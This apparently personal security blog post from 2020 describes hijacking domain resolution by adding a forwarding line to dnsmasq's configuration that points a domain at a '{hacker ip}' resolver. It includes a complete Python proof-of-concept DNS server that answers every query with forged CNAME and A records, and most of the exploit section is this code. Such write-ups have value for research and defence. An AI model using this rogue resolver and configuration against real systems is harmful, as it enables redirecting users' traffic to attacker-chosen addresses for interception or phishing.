---
title: Arbitrary domain name hijacking caused by misconfiguration in dnsmasq
date: 2020-09-09 16:50:00
tags: [dns, dnsmasq]
description: Arbitrary domain name hijacking caused by misconfiguration in dnsmasq
sitemap: false
---

# dnsmasq
> Dnsmasq provides network infrastructure for small networks: DNS, DHCP, router advertisement and network boot. It is designed to be lightweight and have a small footprint, suitable for resource constrained routers and firewalls. It has also been widely used for tethering on smartphones and portable hotspots, and to support virtual networking in virtualisation frameworks. Supported platforms include Linux (with glibc and uclibc), Android, *BSD, and Mac OS X. Dnsmasq is included in most Linux distributions and the ports systems of FreeBSD, OpenBSD and NetBSD. Dnsmasq provides full IPv6 support.  

[dnsmasq homepage][1]

## exploit
1. add this config to `dnsmasq.conf` or `dnsmasq.d/poc.conf`
```
server=/a.net/{hacker ip}
```
then restart the dnsmasq to activate this config.  
* dnsmasq.conf is usually at /usr/local/etc/ if in mac os

2. run this code in the {hacker ip} - `poc.py`

```python
#!/usr/bin/env python3

import sys
from socket import socket, AF_INET, SOCK_DGRAM

class dns:
    def __init__(self):
        # hdr
        self.transactionID  = b"\x00\x00" # --
        self.flags          = b"\x81\x80"
        self.questionNum    = b"\x00\x01"
        self.answerRR       = b"\x00\x02"
        self.authorityRR    = b"\x00\x00"
        self.additionalRR   = b"\x00\x00"

        # queries - only one we need
        self.qname  = b"\x01a\x03net\x00" # -- 0x0c
        self.qtype  = b"\x00\x01"
        self.qclass = b"\x00\x01"

        # answers - CNAME
        self.cnameName    = b"\xc0\x0c"
        self.cnameType    = b"\x00\x05"
        self.cnameClass   = b"\x00\x01"
        self.cnameTtl     = b"\x00\x00\x00\x20"  # domain hijack duration
        self.cnameDataLen = b"\x00\x0d" # --
        self.cnameTarget  = b"\x07example\x03net\x00"  # --

        # answers - A
        self.aName    = b"\xc0\x19"  # --
        self.aType    = b"\x00\x01"
        self.aCLass   = b"\x00\x01"
        self.aTtl     = b"\x00\x00\x00\x20"  # domain hijack duration
        self.aDataLen = b"\x00\x04"
        self.aRecord  = b"\x01\x02\x03\x04"
    
    def _setReply(self, query: bytes):
        self.transactionID = query[:2]
        i = 0x0c
        while i < len(query):
            if query[i] == 0:
                break
            i += 1
        self.qname = query[0x0c:i+1]
        self.aName = ((len(self.qname) + 28) | 0xc000).to_bytes(2, byteorder="big")

    def build(self, query: bytes):
        """build dns response to query"""
        self._setReply(query)
        # build
        hdr = self.transactionID + self.flags + self.questionNum + self.answerRR + self.authorityRR + self.additionalRR
        query = self.qname + self.qtype + self.qclass
        answerCNAME = self.cnameName + self.cnameType + self.cnameClass + self.cnameTtl + self.cnameDataLen + self.cnameTarget
        answerA = self.aName + self.aType + self.aCLass + self.aTtl + self.aDataLen + self.aRecord

        return hdr + query + answerCNAME + answerA  


def dns_server(port: int):
    address = ('', port)
    sock = socket(AF_INET, SOCK_DGRAM)
    sock.bind(address)
    print("Listen UDP on: ", port)
    while True:
        msg, addr = sock.recvfrom(8192)
        print("recv from:", addr)
        if len(msg) > 20:
            d = dns()
            data = d.build(msg)
            sock.sendto(data, addr)


if __name__ == '__main__':
    port = 53
    if len(sys.argv) > 1 and sys.argv[1].isdigit():
        port = int(sys.argv[1])
    dns_server(port)

```

3. check hijack

![poc][2]

[1]: http://www.thekelleys.org.uk/dnsmasq/doc.html
[2]: /assets/images/poc.jpeg